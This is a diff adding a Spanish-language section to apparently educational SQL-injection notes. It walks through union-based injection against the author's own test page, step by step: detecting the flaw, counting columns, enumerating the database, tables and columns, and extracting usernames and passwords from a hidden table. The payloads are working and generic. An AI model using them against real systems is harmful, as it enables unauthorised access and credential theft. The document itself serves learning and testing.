@@ -113,3 +113,32 @@ NUL (ASCII 0), \n, \r, \, ', ", and Control-Z.
 ```
 
 # Página propia
+
+Para empezar en nuestra página vemos solo hay una página, que hace consultas a una tabla. Pero si usamos los siguientes comandos al final sacaremos información de una segunda tabla.
+
+- Con este vemos si la página es vulnerable a inyecciones sql
+```
+' OR 1=1 -- -
+```
+- Con este comprobamos el número de columnas que tiene la tabla
+```
+' union select 1, 1 -- -
+```
+- Con este sacamos el nombre de la base de datos
+```
+' union select 1, database() -- -
+```
+- Con este, utilizando el nombre de la base de datos sacamos los nombres de las tablas
+```
+' union select table_name, null from information_schema.columns where table_schema = "id20453829_peliculas"-- -
+```
+- Tambien utilizando el nombre de la base de datos sacamos los nombres de las columnas de todas las tablas
+```
+' union select column_name, null from information_schema.columns where table_schema = "id20453829_peliculas"-- -
+
+```
+- Y con eso podemos sacar el nombre y contraseña de la tabla usuarios la cual esta oculta
+```
+' union select 1, concat(nombre,'-',contrasena) from usuarios -- -
+
+```
